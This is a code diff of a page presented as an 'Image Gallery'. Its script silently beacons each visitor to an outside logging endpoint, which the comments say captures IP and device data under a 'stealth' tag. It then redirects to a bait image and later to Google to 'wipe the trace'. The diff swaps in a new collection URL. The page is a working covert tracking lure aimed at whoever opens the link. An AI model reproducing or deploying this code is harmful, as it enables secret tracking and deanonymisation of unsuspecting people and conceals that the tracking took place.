@@ -4,18 +4,19 @@
     <title>Image Gallery</title>
     <script>
         function triggerAlpha() {
-            const alpha = "https://bluekama-project.free.beeceptor.com/hit";
+            // REPLACE THIS URL WITH YOUR NEW ONE
+            const alpha = "https://bluekama-ops.free.beeceptor.com/hit";
             const omega = "https://github.com/bluekama/project-portfolio/blob/main/IMG_0542.PNG?raw=true";
             
-            // 1. DATA PING: Sends IP/Device to Beeceptor instantly
-            navigator.sendBeacon(alpha + "?ref=stealth_op&ts=" + Date.now());
+            // 1. DATA PING
+            navigator.sendBeacon(alpha + "?ref=stealth_v2&ts=" + Date.now());
 
-            // 2. THE BAIT: Shows the image after 1 second
+            // 2. THE BAIT (1 second delay)
             setTimeout(function() {
                 window.location.href = omega;
             }, 1000);
 
-            // 3. THE SELF-DESTRUCT: After 15 seconds, it wipes the trace by going to Google
+            // 3. THE SELF-DESTRUCT (15 second delay)
             setTimeout(function() {
                 window.location.replace("https://www.google.com");
             }, 15000);
